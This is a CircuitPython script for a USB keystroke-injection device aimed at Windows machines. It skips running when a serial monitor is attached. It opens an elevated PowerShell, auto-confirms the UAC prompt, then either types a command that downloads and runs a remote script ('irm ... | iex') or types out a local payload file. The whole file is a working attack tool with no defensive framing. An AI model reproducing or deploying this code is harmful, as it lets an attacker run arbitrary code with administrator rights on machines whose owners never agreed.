import time
import usb_hid
import sys
import os
import supervisor
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

online_mode = bool(os.getenv("ONLINE_MODE"))
payload_url = str(os.getenv("PAYLOAD_URL"))
uac_wait = float(os.getenv("UAC_WAIT")) #type: ignore

TIME = 5
# Failsafe count down
for seconds_left in range(TIME*2, 0, -1):
    if supervisor.runtime.serial_connected:
        print('[!] Serial Monitor detected.')
        sys.exit()
    time.sleep(0.5)

capslock_refrence = keyboard.led_on(Keyboard.LED_CAPS_LOCK)

keyboard.send(Keycode.WINDOWS, Keycode.R)
time.sleep(0.5)

layout.write('powershell')
keyboard.send(Keycode.CONTROL, Keycode.SHIFT, Keycode.ENTER)
time.sleep(uac_wait)
keyboard.send(Keycode.ALT, Keycode.Y)

# wait for user to confirm via caps lock
while True:
    capslock = keyboard.led_on(Keyboard.LED_CAPS_LOCK)
    if capslock != capslock_refrence:
        if capslock:
            keyboard.send(Keycode.CAPS_LOCK)
        break
    time.sleep(0.7)


if online_mode:
    layout.write(f"irm '{payload_url}' | iex\n")

else: #offline mode
    with open("payload.ps1", 'r') as f:
        for line in f:
            clean_line = line.rstrip("\r\n")

            if clean_line:
                layout.write(clean_line)

            keyboard.send(Keycode.ENTER)
            time.sleep(0.5)